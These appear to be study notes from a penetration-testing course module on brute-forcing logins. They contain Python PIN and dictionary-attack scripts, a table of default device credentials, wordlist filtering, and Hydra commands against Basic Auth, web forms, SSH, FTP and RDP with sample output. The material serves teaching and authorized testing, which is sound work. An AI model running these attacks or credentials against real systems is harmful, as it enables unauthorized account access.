# Introduction
Keys and passwords, the modern equivalent of locks and combinations, secure the digital world. But what if someone tries every possible combination until they find the one that opens the door? That, in essence, is `brute forcing`.
## What exactly is Brute Forcing?
In cybersecurity, brute forcing is a **trial-and-error** method used to **crack passwords, login credentials, or encryption keys**. It involves systematically trying every possible combination of characters until the correct one is found. The process can be likened to a thief trying every key on a giant keyring until they find the one that unlocks the treasure chest.

**The success of a brute force attack depends on several factors, including:**
- The `complexity` of the password or key. Longer passwords with a mix of uppercase and lowercase letters, numbers, and symbols are **exponentially** more complex to crack.

- The `computational power` available to the attacker. Modern computers and specialized hardware can try **billions** of combinations per second, significantly reducing the time needed for a successful attack.

- The `security measures` in place. **Account lockouts**, **CAPTCHAs**, and **other defences** can slow down or even thwart brute-force attempts.
## How Brute Forcing Works
The brute force process can be visualized as follows:
![[Pasted image 20241216205315.png]]
1. `Start`: The attacker initiates the brute force process.
2. `Generate Possible Combination`: The software generates a potential password or key combination based on predefined parameters, **such as character sets and length**.
3. `Apply Combination`: The generated combination is attempted against the target system, such as a **login form** or **encrypted file**.
4. `Check if Successful`: The system evaluates the attempted combination. If it matches the stored password or key, access is granted. Otherwise, the process continues.
5. `Access Granted`: The attacker gains unauthorized access to the system or data.
6. `End`: The process repeats, generating and testing new combinations until either the correct one is found or the attacker gives up.
## Types of Brute Forcing

Brute forcing is not a monolithic entity but a **collection of diverse techniques**, each with its strengths, weaknesses, and ideal use cases. Understanding these variations is crucial for both attackers and defenders, as it enables the former to choose the most effective approach and the latter to implement targeted countermeasures.
The following table provides a comparative overview of various brute-forcing methods:
t

| Method                  | Desc.                                                                                                                                   | Example                                                                                                                                                  | Best Used When..                                                                                                                                        |
| ----------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Simple Brute Force      | Systematically tries all possible combinations of characters within a defined character set and range.                                  | Trying all combinations of lowercase letters from `a` to `z` for passwords of length `4` to `6`.                                                         | **No prior information** about the password is available, and computational resources are abundant.                                                     |
| Dictionary Attack       | Uses a pre-compiled list of common words, phrases, and passwords.                                                                       | Trying passwords from a list like `rockyou.txt` against a login form.                                                                                    | The target will likely use a **weak** or **easily guessable** password based on common patterns.                                                        |
| Hybrid Attack           | Combines elements of simple brute force and dictionary attacks, often with appending and prepending characters to the dictionary words. | **Adding** **numbers** or **special characters** to the **end** of words **from** a **dictionary** list.                                                 | The target might use a slightly modified version of a common password.                                                                                  |
| Credential Stuffing     | Utilizes leaked credentials from one service to attempt access to other services, assuming users reuse passwords.                       | Using a list of usernames and passwords **leaked** from a data breach to try logging into various online accounts.                                       | **A large set of leaked credentials is available**, and the target is suspected of **reusing passwords** across multiple services.                      |
| Password Spraying       | Attempts a small set of commonly used passwords against a large number of usernames.                                                    | Trying passwords like `password123` or `qwerty` **against all usernames in an organization**.                                                            | **Account lockout policies** are in place, and the attacker aims to **avoid detection** by spreading attempts across multiple accounts.                 |
| Rainbow Table Attack    | Uses pre-computed tables of password hashes to reverse hashes and recover plaintext passwords quickly.                                  | Pre-computing hashes for all possible passwords of a certain length and character set, then comparing captured hashes against the table to find matches. | A large number of password hashes need to be cracked, and storage space for the rainbow tables is available.                                            |
| Reverse Brute Force     | Targets a single password against multiple usernames, often used in conjunction with credential stuffing attacks.                       | Using a **leaked password** from one service to try logging into **multiple accounts** with different **usernames**.                                     | A strong suspicion exists that a particular password is being **reused** across multiple accounts.                                                      |
| Distributed Brute Force | Distributes the brute forcing workload across multiple devices to accelerate the process.                                               | Using a cluster of computers to perform a **brute-force** attack to significantly increase the number of combinations that can be tried per second.      | The target password or key is **highly complex**, and a single machine **lacks** the **computational power** to crack it within a reasonable timeframe. |
### The Role of Brute Forcing in Penetration Testing
While penetration tests encompass a range of techniques, brute forcing is often strategically employed when:
- **Other avenues are exhausted**: Initial attempts to gain access, such as exploiting known vulnerabilities or utilizing social engineering tactics, may prove unsuccessful. In such scenarios, brute forcing is a viable alternative to overcome password barriers.
- **Password policies are weak**: If the target system employs lax password policies, it increases the likelihood of users having weak or easily guessable passwords. Brute forcing can effectively expose these vulnerabilities.
- **Specific accounts are targeted**: In some instances, penetration testers may focus on compromising specific user accounts, such as those with elevated privileges. Brute forcing can be tailored to target these accounts directly.
## Password Security Fundamentals
Passwords are the first line of defence in protecting sensitive information and systems. A strong password is a formidable barrier, making it significantly harder for attackers to gain unauthorized access.
### Common Password Weaknesses
- **Short Passwords:** Passwords with fewer than **eight** characters are particularly vulnerable to brute-force attacks, as the number of possible combinations is relatively small.
- **Common Words and Phrases:** Using dictionary words, names, or common phrases as passwords makes them susceptible to dictionary attacks.
- **Personal Information:** Incorporating personal information like **birthdates**, **pet names**, or **addresses** into passwords makes them easier to guess, especially if this information is publicly available on social media or other online platforms.
- **Reusing Passwords:** Using the same password across multiple accounts is risky. If one account is compromised, all other accounts using the same password are also at risk.
- **Predictable Patterns:** Using patterns like "**qwerty**" or "**123456**" or simple substitutions like "**p@ssw0rd**" makes passwords easy to guess.
### Password Policies
Organizations often implement password policies to enforce the use of strong passwords. These policies typically include requirements for:
- **Minimum Length**: The minimum number of characters a password must have.
- **Complexity:** The types of characters that must be included in a password (e.g., **uppercase, lowercase, numbers, symbols**).
- **Password Expiration:** The frequency where you have to change passwords periodically.
- **Password History:** Previous passwords cannot be reused.
### The Perils of Default Credentials
Often overlooked is the danger posed by **default passwords**. They are often simple and easily guessable, making them a prime target for attackers.

The prevalence of default passwords makes them **low-hanging fruit** for attackers. They provide an easy entry point into systems and networks, potentially leading to data breaches, unauthorized access, and other malicious activities. **Below are examples of certain default passwords:**
![[Pasted image 20241216232427.png]]
**Or in a table format**

| <font color=" #8a5cf5">**Device/Manufacturer**</font> | <font color="#29dd01">Default Username</font> | <font color="#29dd01">Default Password </font> | <font color="#8a5cf5">Device Type </font> |
| ----------------------------------------------------- | --------------------------------------------- | ---------------------------------------------- | ----------------------------------------- |
| **Linksys Router**                                    | admin                                         | admin                                          | **Router**                                |
| **D-Link Router**                                     | admin                                         | admin                                          | **Router**                                |
| **Netgear Router**                                    | admin                                         | password                                       | **Router**                                |
| **TP-Link Router**                                    | admin                                         | admin                                          | **Router**                                |
| **Cisco Router**                                      | admin                                         | cisco                                          | **Router**                                |
| **Asus Router**                                       | admin                                         | admin                                          | **Router**                                |
| **Belkin Router**                                     | admin                                         | password                                       | **Router**                                |
| **Zyxel Router**                                      | admin                                         | 1234                                           | **Router**                                |
| **Samsung SmartCam**                                  | admin                                         | 4321                                           | **IP Camera**                             |
| **Hikvision DVR**                                     | admin                                         | 12345                                          | **Digital Video Recorder (DVR)**          |
| **Axis IP Camera**                                    | root                                          | pass                                           | **IP Camera**                             |
| **Ubiquiti UniFi AP**                                 | ubnt                                          | ubnt                                           | **Wireless Access Point (WAP)**           |
| **Canon Printer**                                     | admin                                         | admin                                          | **Network Printer**                       |
| **Honeywell Thermostat**                              | admin                                         | 1234                                           | **Smart Thermostat**                      |
| **Panasonic DVR**                                     | admin                                         | 12345                                          | **Digital Video Recorder (DVR)**          |
To truly grasp the challenge of brute forcing, it's essential **to understand the underlying mathematics**. The following formula determines the **total number of possible combinations for a password:**
```mathML
Possible Combinations = Character Set Size^Password Length
```
For example, a **6-character password** using only lowercase letters (character set size of 26) has 26^6 (approximately 300 million) possible combinations. In contrast, an 8-character password with the same character set has 26^8 (approximately 200 billion) combinations. Adding uppercase letters, numbers, and symbols to the character set further expands the search space exponentially.

This exponential growth in the number of combinations highlights the importance of password length and complexity. Even a small increase in length or the inclusion of additional character types can dramatically increase the time and resources required for a successful brute-force attack.

Let's consider a few scenarios to illustrate the impact of password length and character set on the search space:

|                             | Password Length | Character Set                                         | Possible Combinations               |
| --------------------------- | --------------- | ----------------------------------------------------- | ----------------------------------- |
| **Short and Simple**        | 6               | Lowercase letters (a-z)                               | 26^6 = 308,915,776                  |
| **Longer but Still Simple** | 8               | Lowercase letters (a-z)                               | 26^8 = 208,827,064,576              |
| **Adding Complexity**       | 8               | Lowercase and uppercase letters (a-z, A-Z)            | 52^8 = 53,459,728,531,456           |
| **Maximum Complexity**      | 12              | Lowercase and uppercase letters, numbers, and symbols | 94^12 = 475,920,493,781,698,549,504 |
While a complex password can take **years** to brute-force with a single machine, a sophisticated attacker using a distributed network of high-performance computing resources could reduce that time drastically:
![[Pasted image 20241216233948.png]]
Comparing the basic computer and the supercomputer:
- **Basic Computer (1 million passwords/second)**: Good for cracking simple passwords quickly but becomes impractically slow for complex passwords. For instance, cracking an 8-character password using letters and digits would take approximately 6.92 years.
- **Supercomputer (1 trillion passwords/second)**: Drastically reduces cracking times for simpler passwords. However, even with this immense power, cracking highly complex passwords can take an impractical amount of time. For example, a 12-character password with all ASCII characters would still take about **15000** years to crack.
# Brute Force Attacks
##  Cracking the PIN
The example application generates a random **4-digit PIN** and exposes an endpoint (`/pin`) that accepts a **PIN** as a query parameter. If the provided **PIN** matches the generated one, the application responds with a success message and a flag. Otherwise, it returns an error message.

We will use this simple demonstration **Python** script to brute-force the `/pin` endpoint on the **API**.

Copy and paste this Python script below as `pin-solver.py` onto your machine. You only need to modify the **IP** and **port** variables to match your target system information:
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Try every possible 4-digit PIN (from 0000 to 9999)
for pin in range(10000):
    formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
    print(f"Attempted PIN: {formatted_pin}")

    # Send the request to the server
    response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

    # Check if the server responds with success and the flag is found
    if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
        print(f"Correct PIN found: {formatted_pin}")
        print(f"Flag: {response.json()['flag']}")
        break
```
The Python script systematically iterates **all possible 4-digit PINs (0000 to 9999)** and sends **GET** requests to the Flask endpoint with each **PIN**. It checks the response status code and content to identify the correct **PIN** and capture the associated flag:
```bash
$ python pin-solver.py
- - - -
...SNIP...
Attempted PIN: 4048
Attempted PIN: 4049
Attempted PIN: 4050
Attempted PIN: 4051
Attempted PIN: 4052
Correct PIN found: 4053
Flag: HTB{...}
```
## Dictionary Attack
The example application creates a route (`/dictionary`) that handles **POST** requests. It expects a `password` parameter in the request's form data. Upon receiving a request, it compares the submitted password against the expected value. 

If there's a match, it responds with a **JSON** object containing a success message and the flag. Otherwise, it returns an error message with a **401** status code (**Unauthorized**).

Copy and paste this Python script below as `dictionary-solver.py` onto your machine. You only need to modify the **IP** and **port** variables to match your target system information:
```python
import requests

ip = "127.0.0.1"  # Change this to your instance IP address
port = 1234       # Change this to your instance port number

# Download a list of common passwords from the web and split it into lines
passwords = requests.get("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/500-worst-passwords.txt").text.splitlines()

# Try each password from the list
for password in passwords:
    print(f"Attempted password: {password}")

    # Send a POST request to the server with the password
    response = requests.post(f"http://{ip}:{port}/dictionary", data={'password': password})

    # Check if the server responds with success and contains the 'flag'
    if response.ok and 'flag' in response.json():
        print(f"Correct password found: {password}")
        print(f"Flag: {response.json()['flag']}")
        break
```

```bash
$ python3 dictionary-solver.py

...SNIP...
Attempted password: golf
Attempted password: bear
Attempted password: tiger
Correct password found: ...
Flag: HTB{...}
```
The Python script orchestrates the dictionary attack. It performs the following steps:
1. **Downloads the Wordlist**: First, the script fetches a wordlist of **500 commonly used** (and therefore weak) passwords from **SecLists** using the `requests` library.

2. **Iterates and Submits Passwords:** It then iterates through each password in the downloaded wordlist. For each password, it sends a **POST** request to the Flask application's `/dictionary` endpoint, including the password in the request's form data.

3. **Analyses Responses:** The script checks the response status code after each request. If it's **200** (**OK**), it examines the response content further. If the response contains the "**flag**" key, it signifies a successful login. The script then prints the discovered password and the captured flag.

4. **Continues or Terminates:** If the response doesn't indicate success, the script proceeds to the next password in the wordlist. This process continues until the correct password is found or the entire wordlist is exhausted.
## Hybrid Attacks Explained
Many organizations implement policies **requiring users to change their passwords periodically** to enhance security. However, these policies can inadvertently breed predictable password patterns.
![[Pasted image 20241217003428.png]]
### Hybrid Attacks in Action
Let's illustrate this. Consider an attacker targeting an organization known to enforce regular password changes.
![[Pasted image 20241217003522.png]]
The attacker begins by launching a dictionary attack, using a wordlist curated with common passwords, industry-specific terms, and potentially personal information related to the organization or its employees. **This phase attempts to quickly identify any low-hanging fruit - accounts protected by weak or easily guessable passwords.**

However, if the dictionary attack proves unsuccessful, the hybrid attack seamlessly transitions into a **brute-force mode**. Instead of randomly generating password combinations, it strategically modifies the words from the original wordlist, appending numbers, special characters, or even incrementing years, as in the "**Summer2023**" example.
### The Power of Hybrid Attacks
The effectiveness of hybrid attacks lies in their adaptability and efficiency. They leverage the strengths of both dictionary and brute-force techniques, maximizing the chances of cracking passwords, especially in scenarios where users fall into predictable patterns.

It's important to note that hybrid attacks **are not limited to the password change scenario described above**. They can be tailored to exploit any **observed** or **suspected** password patterns within a target organization. Let's consider a scenario where you have access to a common passwords wordlist, and you're targeting an organization with the following password policy:
- Minimum length: 8 characters
- Must include:
    - At least one uppercase letter
    - At least one lowercase letter
    - At least one number

To extract only the passwords that adhere to this policy, we can leverage `grep` paired with `regex`. We are going to use the [darkweb2017-top10000.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/darkweb2017-top10000.txt) password list for this. First, download the wordlist like:
```bash
$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/darkweb2017-top10000.txt
```

Next, we need to start matching that wordlist to the password policy:
```bash
$ grep -E '^.{8,}$' darkweb2017-top10000.txt > darkweb2017-minlength.txt
```
This `grep` command targets the requirement of **a minimum password length of 8 characters**. The regular expression `^.{8,}$` acts as a filter, ensuring that only passwords containing **at least 8 characters** are passed through and saved in a temporary file named `darkweb2017-minlength.txt`.

Then let's match passwords with uppercase letters:
```bash
$ grep -E '[A-Z]' darkweb2017-minlength.txt > darkweb2017-uppercase.txt
```
This `grep` command adheres the policy's demand for **at least one uppercase letter**. The regular expression `[A-Z]` ensures that any password lacking an uppercase letter is discarded.

Next, let's get passwords which have lowercase letters:
```bash
$ grep -E '[a-z]' darkweb2017-uppercase.txt > darkweb2017-lowercase.txt
```
This `grep` command ensures compliance with the policy's requirement for **at least one lowercase letter**. The regular expression `[a-z]` serves as the filter, keeping only passwords that include at least one lowercase letter and storing them in `darkweb2017-lowercase.txt`.

And lastly, let's get all passwords containing at least one number:
```bash
$ grep -E '[0-9]' darkweb2017-lowercase.txt > darkweb2017-number.txt
```
This last `grep` adheres to the numerical requirement. The regular expression `[0-9]` acts as a filter, ensuring that passwords containing at least one numerical digit are preserved in `darkweb2017-number.txt`.

Now to check the amount of words within the filtered password list:
```bash
$ wc -l darkweb2017-number.txt

89 darkweb2017-number.txt
```
Meticulously filtering the extensive **10,000-password list** against the password policy has dramatically narrowed down our potential passwords to **89**. A smaller, targeted list translates to a faster and more focused attack, increasing the likelihood of a successful breach.

## Credential Stuffing: Using Stolen Data for Unauthorized Access
Credential stuffing exploits the fact that many users reuse passwords across multiple online accounts.
![[Pasted image 20241217004539.png]]
It's a **multi-stage** process that begins with attackers **acquiring lists** of **compromised usernames and passwords**. These lists can stem from large-scale data breaches or be compiled through phishing scams and malware. Public wordlists like `rockyou` or those in `seclists` can also serve as a starting point.

Once armed with these credentials, attackers identify potential targets - online services likely used by the individuals whose information they possess. **Social media, email providers, online banking, and e-commerce sites** are prime targets due to the sensitive data they often hold.

The attack then shifts into an automated phase. Attackers use **tools** or **scripts** to systematically test the stolen credentials against the chosen targets, often mimicking normal user behaviour to avoid detection. This allows them to **rapidly** test vast numbers of credentials, increasing their chances of finding a match.

# Hydra
**Hydra** is a **fast network login cracker** that supports numerous attack protocols. It is a versatile tool that can brute-force a wide range of services, including **web apps**, remote login services like **SSH** and **FTP**, and **even databases**.

Hydra's popular due to its:
- **Speed and Efficiency:** Hydra utilizes parallel connections to perform multiple login attempts simultaneously.
- **Flexibility:** Hydra supports many protocols and services, making it adaptable to various attack scenarios.
## Basic Usage
```bash
$ hydra [login_options] [password_options] [attack_options] [service_options]
```
Where:

| Parameter              | Explanation                                                                                                      | Usage Example                                                                                                   |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------- |
| `-l LOGIN`or `-L FILE` | **Login options**: Single username (`-l`) or a file containing a list of usernames (`-L`).                       | `hydra -l admin` or<br>`hydra -L usernames.txt`                                                                 |
| `-p PASS` or `-P FILE` | **Password options**: Single password (`-p`) or a file containing a list of passwords (`-P`).                    | `hydra -p password123` or `hydra -P passwords.txt`                                                              |
| `-t TASKS`             | **Tasks**: Define the number of parallel tasks (threads) to run, potentially speeding up the attack.             | `hydra -t 4`                                                                                                    |
| `-f`                   | **Fast mode**: Stop the attack after the first successful login is found.                                        | `hydra -f`                                                                                                      |
| `-s PORT`              | **Port**: Specify a **non-default** port for the target service.                                                 | `hydra -s 2222`                                                                                                 |
| `-v` or `-V`           | **Verbose output**: Display detailed information about the attack's progress, including attempts and results.    | `hydra -v` or `hydra -V` for more verbose                                                                       |
| `service://server`     | **Target**: Specify the service (i.e. `ssh`, `http`, `ftp`) and the target **server's address** or **hostname**. | `hydra ssh://192.168.1.100`                                                                                     |
| `/OPT`                 | **Service-specific options**: Provide any additional options required by the target service.                     | `hydra http-get://example.com/login.php -m "POST:user=^USER^&pass=^PASS^"` (for HTTP form-based authentication) |
## Hydra Services
Hydra services enable Hydra to interact with different authentication mechanisms used by various systems, applications, and network services. Each module is designed to understand a particular protocol's communication patterns and authentication requirements, allowing Hydra to send appropriate login requests and interpret the responses. Below is a table of commonly used services:
![[S1MQhi0VJe.png]]
## Brute-Forcing HTTP Authentication
```bash
$ hydra -L usernames.txt -P passwords.txt www.example.com http-get
```
This command instructs Hydra to:
1. Use the list of usernames from the `usernames.txt` file.
2. Use the list of passwords from the `passwords.txt` file.
3. Target the website `www.example.com`.
4. Employ the **http-get** module to test the **HTTP authentication**.

Hydra will systematically try each username-password combination against the target website to discover a valid login.
## Targeting Multiple SSH Servers
Consider a situation where you have several SSH servers. You compile their **IP addresses** into a file named `targets.txt` and know that these servers might use the default username "**root**" and password "**toor**". To efficiently test all these servers simultaneously, use the following Hydra command:
```bash
$ hydra -l root -p toor -M targets.txt ssh
```
This command instructs Hydra to:
1. Use the username "root".
2. Use the password "toor".
3. Target all IP addresses listed in the `targets.txt` file.
4. Employ the **ssh** module for the attack

## Testing FTP Credentials on a Non-Standard Port
Imagine you need to assess the security of an **FTP** server hosted at ``ftp.example.com``, which operates on a non-standard port `2121`. 

You have lists of potential usernames and passwords stored in ``usernames.txt`` and ``passwords.txt``, respectively. To test these credentials against the **FTP** service, use the following Hydra command:
```bash
$ hydra -L usernames.txt -P passwords.txt -s 2121 -V ftp.example.com ftp
```
This command instructs Hydra to:
1. Use the list of usernames from the ``usernames.txt`` file.
2. Use the list of passwords from the ``passwords.txt`` file.
3. Target the **FTP** service on ``ftp.example.com`` via port **2121**.
4. Use the **ftp** module and provide verbose output (**-V**) for detailed monitoring.

Here Hydra will attempt to match each username-password combination against the FTP server on the specified port.

## Brute-Forcing a Web Login Form (HTTP/S)
Suppose you are tasked with brute-forcing a **login form** on a web app at www.example.com. You know the username is "**admin**", and the **form parameters** for the login are `user=^USER^&pass=^PASS^`. To perform this attack, use the following Hydra command:
```bash
$ hydra -l admin -P passwords.txt www.example.com http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
Where:
1. Use the username "admin".
2. Use the list of passwords from the `passwords.txt` file.
3. Target the login form at `/login` on `www.example.com`.
4. Employ the `http-post-form` module with the specified form parameters.
5. Look for a successful login indicated by the **HTTP status code 302**.

Hydra will systematically attempt each password for the "admin" account, checking for the specified success condition.

## Advanced RDP Brute-Forcing
Suppose you're testing a **Remote Desktop Protocol** (**RDP**) service on a server with IP `192.168.1.100`. You suspect the username is "**administrator**", and that the password consists of **6 to 8** characters, including **lowercase letters, uppercase letters, and numbers**. To carry out this precise attack, use the following Hydra command:
```bash
$ hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
This command instructs Hydra to:
1. Use the username "administrator".
2. Generate and test passwords ranging from **6 to 8** characters, using the specified character set.
3. Target the **RDP** service on `192.168.1.100`.
4. Employ the `rdp` module for the attack.

## Basic HTTP Authentication
### Pre-Info
Web apps often employ **authentication mechanisms** to protect sensitive data and functionalities. **Basic HTTP Authentication**, or simply **Basic Auth**, is a rudimentary yet common method for securing resources on the web. It's easy to implement, but it's security vulnerabilities make it a frequent target for brute-force attacks.

In essence, **Basic Auth** is a challenge-response protocol where a web server demands user credentials before granting access to protected resources. 
The process begins with a user attempting to access a restricted area. The server responds with a **401 Unauthorized** status and a WWW-Authenticate header prompting the user's browser to present a login dialog.

Once the user provides their **username** and **password**, the browser concatenates them into **a single string**, separated by a **colon**. This string is then encoded using **Base64** and included in the **Authorization header** of subsequent requests, following the format `Basic <encoded_credentials>`. The server decodes the credentials, verifies them against its database, and grants or denies access accordingly.

For example, the headers for Basic Auth in a **HTTP GET** request would look like:
```http
GET /protected_resource HTTP/1.1
Host: www.example.com
Authorization: Basic YWxpY2U6c2VjcmV0MTIz
```
### Exploiting Basic Auth with Hydra
We will use the ``http-get`` hydra service to brute force the basic auth target.

In this scenario, the spawned target instance employs **Basic HTTP Authentication**. We already know the username is ``basic-auth-user``. Since we know the username, we can simplify the **Hydra** command and focus solely on brute-forcing the **password**. Here's the command we'll use:
```bash
# Download wordlist if needed, via:
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt

# Hydra command
$ hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81

...
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-09 16:04:31
[DATA] max 16 tasks per 1 server, overall 16 tasks, 200 login tries (l:1/p:200), ~13 tries per task
[DATA] attacking http-get://127.0.0.1:81/
[81][http-get] host: 127.0.0.1   login: basic-auth-user   password: ...
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-09 16:04:32
```
Let's break down the command:

* ``-l basic-auth-user``: Specifies that the username for the login attempt is `basic-auth-user`.
* `-P 2023-200_most_used_passwords.txt`: This indicates that Hydra should use the password list contained in the file `2023-200_most_used_passwords.txt` for its brute-force attack.
* ``127.0.0.1``: This is the **target IP** address, in this case, the local machine (localhost).
* ``http-get /``: This tells Hydra that the target service is an **HTTP** server and the attack should be performed using **HTTP GET** requests to the root path (**'/'**).
* `-s 81`: This overrides the default port for the **HTTP** service and sets it to **81**.

Hydra will attempt each password from the `2023-200_most_used_passwords.txt` file against the specified resource. Eventually it will return the correct password for `basic-auth-user`, which you can use to login to the website.

### Login Forms
Beyond **Basic HTTP Auth**, many web apps employ **custom login forms** as their primary authentication mechanism. These forms, while visually diverse, often share common underlying mechanics that make them targets for brute forcing.
#### Login Form Info / Understanding Login Forms
While login forms may appear as simple boxes soliciting your username and password, they represent a complex interplay of **client-side** and **server-side** technologies. 
At their core, login forms are essentially **HTML forms** embedded within a webpage. These forms typically include:
1. Input fields (`<input>`): for capturing the username and password
2. A submit button (`<button>` or `<input type="submit">`): to initiate the authentication process.
##### A Basic Login Form Example
```html
<form action="/login" method="post">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username"><br><br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password"><br><br>
  <input type="submit" value="Submit">
</form>
```
When submitted, this form sends a **POST** request to the `/login` endpoint on the server, including the entered **username** and **password** as form data:
```http
POST /login HTTP/1.1
Host: www.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=john&password=secret123
```
* The ``POST`` method indicates that data is being sent to the server to create or update a resource.
* ``/login`` is the **URL endpoint** handling the login request.
* The ``Content-Type`` header specifies how the data is encoded in the request body.
* The ``Content-Length`` header indicates the size of the data being sent.
* The ``request body`` contains the **username** and **password**, encoded as key-value pairs.

When a user interacts with a login form, the browser captures the entered credentials, often employing JavaScript for client-side validation or input sanitization.
Upon submission, the browser constructs an **HTTP POST** request. This request encapsulates the form data—including the **username** and **password**—within its body, often encoded as ``application/x-www-form-urlencoded`` or ``multipart/form-data``.
### http-post-form
Hydra's ``http-post-form`` service is **specifically designed to target login forms**. It enables the automation of **POST** requests, dynamically inserting **username** and **password** combinations into the request body.

The general structure of a Hydra command using ``http-post-form`` looks like this:
```bash
$ hydra [options] target http-post-form "path:params:condition_string"
```
#### Understanding the Condition String
In **Hydra**’s ``http-post-form`` module, success and failure conditions are crucial for properly identifying **valid and invalid login attempts**. Hydra primarily relies on failure conditions (``F=...``) to determine when a login attempt has failed, but you can also specify a success condition (``S=...``) to indicate when a login is successful.

The failure condition (``F=...``) is used to check for a specific string in the server's response that signals a failed login attempt. This is the most common approach because many websites return an error message (i.e "``Invalid username or password``") when the login fails.

**For example**:
If a login form returns the message "``Invalid credentials``" on a failed attempt, you can configure Hydra like this:
```bash
hydra ..SNIP.. http-post-form "/login:user=^USER^&pass=^PASS^:F=Invalid credentials"
```
In this case, Hydra will check each response for the string "``Invalid credentials.``" If it finds this phrase, it will mark the login attempt as a failure and move on to the next username/password pair.

However, sometimes you may not have a clear failure message but instead have a distinct success condition. For instance, if the application redirects the user after a successful login (using **HTTP** status code **302**), or displays specific content (like "**Dashboard**" or "**Welcome**"), you can configure **Hydra** to look for that success condition using ``S=``. Here’s an example where a successful login results in a **302** redirect:
```bash
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"
```
In this case, Hydra will treat any response that returns an **HTTP 302** status code as a successful login.

Similarly, if a successful login results in content like "**Dashboard**" appearing on the page, you can configure Hydra to look for that keyword as a success condition:
```bash     
hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=Dashboard"
```
Hydra will now register the login as successful if it finds the word "**Dashboard**" in the server’s response.
#### Manual Inspection
Upon accessing the ``IP:PORT`` in your browser, a basic login form is presented. Using your browser's developer tools, you can view the underlying **HTML code** for this form. Let's break down its key components:
```html
<form method="POST">
    <h2>Login</h2>
    <label for="username">Username:</label>
    <input type="text" id="username" name="username">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password">
    <input type="submit" value="Login">
</form>
```
The **HTML** reveals a simple login form. 
**Key points for Hydra:**
* **Method:** POST - Hydra will need to send **POST** requests to the server.
* **Fields**:
    * **Username**: The input field named **username** will be targeted.
    * **Password**: The input field named **password** will be targeted.

With these details, **you can construct the Hydra command** to automate the brute-force attack against this login form.

##### Browser Developer Tools
After inspecting the form, open your browser's Developer Tools (``F12``) and navigate to the ``Network`` tab. Then, **submit a sample login attempt with any credentials**.
This will allow you to see the **POST** request sent to the server. In the ``Network`` tab, find the request corresponding to the form submission and check the **form data, headers**, and **the server’s response**.
![[By_X-kkryg.png]]
This information solidifies the information we will need for **Hydra**. We now have definitive confirmation of both the target path (``/``) and the parameter names (``username`` and ``password``).
##### Proxy Interception
For more complex scenarios, **intercepting the network traffic with a proxy tool like Burp Suite can be invaluable**. The proxy will capture the **POST** request, allowing you to dissect its every component, including the precise login parameters and their values.
##### Constructing the params String for Hydra
After analyzing the login form's structure and behavior, it's time to build the **params string**, a critical component of Hydra's ``http-post-form`` attack module. 
This string encapsulates the data that will be sent to the server with each login attempt, mimicking a legitimate form submission.

The params string consists of **key-value pairs**, similar to how data is encoded in a **POST** request. Each pair represents a field in the login form, with its corresponding value:

* **Form Parameters:** These are the essential fields that hold the **username** and **password**. **Hydra** will dynamically replace placeholders (``^USER^`` and ``^PASS^) within these parameters with values from your wordlists.

* **Additional Fields:** If the form includes other hidden fields or tokens (e.g., **CSRF tokens**), **they must also be included in the params string**. These can have static values or dynamic placeholders if their values change with each request.

* **Success Condition:** This defines the criteria **Hydra** will use to identify a successful login. It can be an **HTTP** status code (like ``S=302`` for a redirect) or the presence or absence of specific text in the server's response (e.g., ``F=Invalid credentials`` or ``S=Welcome``).

Let's apply this to our scenario. We've discovered:
* The form submits data to the root path (``/``).
* The username field is named **username**.
* The password field is named **password**.
* An error message "``Invalid credentials``" is displayed upon failed login.
Therefore, our **params** string would be:
```bash
/:username=^USER^&password=^PASS^:F=Invalid credentials
```
**Where:**
* "`/`": The path where the form is submitted.
* `username=^USER^&password=^PASS^`: The form parameters with placeholders for Hydra.
* `F=Invalid credentials`: The failure condition – Hydra will consider a login attempt unsuccessful if it sees this string in the response.

Hydra will systematically substitute ``^USER^`` and ``^PASS^`` with values from your wordlists, sending **POST** requests to the target and analysing the responses for the specified failure condition. If a login attempt doesn't trigger the "``Invalid credentials``" message, Hydra will flag it as a potential success, revealing the valid credentials.
```bash
# Download wordlists if needed
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/top-usernames-shortlist.txt
$ curl -s -O https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/2023-200_most_used_passwords.txt

# Hydra command
$ hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"

...SNIP...
[DATA] attacking http-post-form://IP:PORT/:username=^USER^&password=^PASS^:F=Invalid credentials
[5000][http-post-form] host: IP   login: ...   password: ...
[STATUS] attack finished for IP (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-05 12:51:28
```
